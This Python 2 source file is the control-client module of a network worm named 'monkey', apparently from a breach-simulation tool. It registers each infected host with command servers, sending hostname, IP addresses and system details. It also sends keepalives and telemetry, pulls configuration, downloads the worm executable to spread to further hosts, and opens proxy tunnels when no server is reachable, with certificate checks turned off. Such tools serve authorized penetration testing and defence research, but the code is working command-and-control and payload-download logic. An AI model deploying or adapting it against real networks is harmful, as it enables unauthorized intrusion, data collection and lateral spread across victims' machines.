
import json
import random
import logging
import requests
import platform
import monkeyfs
from network.info import local_ips
from socket import gethostname, gethostbyname_ex
from config import WormConfiguration, Configuration, GUID
from transport.tcp import TcpProxy
from transport.http import HTTPConnectProxy
import tunnel

__author__ = 'hoffer'

requests.packages.urllib3.disable_warnings()

LOG = logging.getLogger(__name__)
DOWNLOAD_CHUNK = 1024

class ControlClient(object):
    proxies = {}

    @staticmethod
    def wakeup(parent=None):
        for server in WormConfiguration.command_servers:
            try:
                hostname = gethostname()
                if None == parent:
                    parent = GUID

                WormConfiguration.current_server =  server                

                monkey = {  'guid': GUID,
                            'hostname' : hostname,
                            'ip_addresses' : local_ips(),
                            'description' : " ".join(platform.uname()),
                            'config' : WormConfiguration.as_dict(),
                            'parent' : parent,
                }

                if ControlClient.proxies:
                    monkey['tunnel'] = ControlClient.proxies.get('https')
                
                reply = requests.post("https://%s/api/monkey" % (server,), 
                                        data=json.dumps(monkey),
                                        headers={'content-type' : 'application/json'},
                                        verify=False, 
                                        proxies=ControlClient.proxies)
                
                break

            except Exception, exc:
                WormConfiguration.current_server = ''
                LOG.warn("Error connecting to control server %s: %s",
                         server, exc)

        if not WormConfiguration.current_server:
            if not ControlClient.proxies:
                LOG.info("Starting tunnel lookup...")
                proxy_find =  tunnel.find_tunnel()
                if proxy_find:
                    LOG.info("Found tunnel at %s:%s" % proxy_find)
                    ControlClient.proxies['https'] = 'https://%s:%s' % proxy_find
                    ControlClient.wakeup(parent)
                else:
                    LOG.info("No tunnel found")

    @staticmethod
    def keepalive():
        if not WormConfiguration.current_server:
            return
        try:
            monkey = {}
            if ControlClient.proxies:
                monkey['tunnel'] = ControlClient.proxies.get('https')            
            reply = requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID), 
                                    data=json.dumps(monkey),
                                    headers={'content-type' : 'application/json'},
                                    verify=False, 
                                    proxies=ControlClient.proxies)
        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
            return {}

    @staticmethod
    def send_telemetry(tele_type='general',data=''):
        if not WormConfiguration.current_server:
            return        
        try:
            telemetry = {'monkey_guid': GUID, 'telem_type': tele_type, 'data' : data}
            reply = requests.post("https://%s/api/telemetry" % (WormConfiguration.current_server,), 
                                    data=json.dumps(telemetry),
                                    headers={'content-type' : 'application/json'},
                                    verify=False, 
                                    proxies=ControlClient.proxies)

        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

    @staticmethod
    def load_control_config():
        if not WormConfiguration.current_server:
            return        
        try:
            reply = requests.get("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID), 
                                verify=False, 
                                proxies=ControlClient.proxies)

        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
            return

        try:
            WormConfiguration.from_dict(reply.json().get('config'))
        except Exception, exc:
            LOG.warn("Error parsing JSON reply from control server %s (%s): %s",
                     WormConfiguration.current_server, reply._content, exc)

    @staticmethod
    def download_monkey_exe(host):
        if not WormConfiguration.current_server:
            return None        
        try:
            reply = requests.post("https://%s/api/monkey/download" % (WormConfiguration.current_server,), 
                                    data=json.dumps(host.as_dict()),
                                    headers={'content-type' : 'application/json'},
                                    verify=False, proxies=ControlClient.proxies)

            if 200 == reply.status_code:
                result_json = reply.json()
                filename = result_json.get('filename')
                if not filename:
                    return None
                size = result_json.get('size')
                dest_file = monkeyfs.virtual_path(filename)
                if monkeyfs.isfile(dest_file) and size == monkeyfs.getsize(dest_file):
                    return dest_file
                else:
                    download = requests.get("https://%s/api/monkey/download/%s" % (WormConfiguration.current_server, filename),
                                            verify=False, 
                                            proxies=ControlClient.proxies)

                    with monkeyfs.open(dest_file, 'wb') as file_obj:
                        for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
                            if chunk:
                                file_obj.write(chunk)
                        file_obj.flush()
                    if size == monkeyfs.getsize(dest_file):
                        return dest_file

        except Exception, exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
        
        return None


    @staticmethod
    def create_control_tunnel():
        if not WormConfiguration.current_server:
            return None
        
        my_proxy = ControlClient.proxies.get('https', '').replace('https://', '')
        if my_proxy:
            proxy_class = TcpProxy
            try:
                target_addr, target_port = my_proxy.split(':', 1)
                target_port = int(target_port)
            except:
                return None
        else:
            proxy_class = HTTPConnectProxy
            target_addr, target_port = None, None

        return tunnel.MonkeyTunnel(proxy_class, target_addr=target_addr, target_port=target_port)



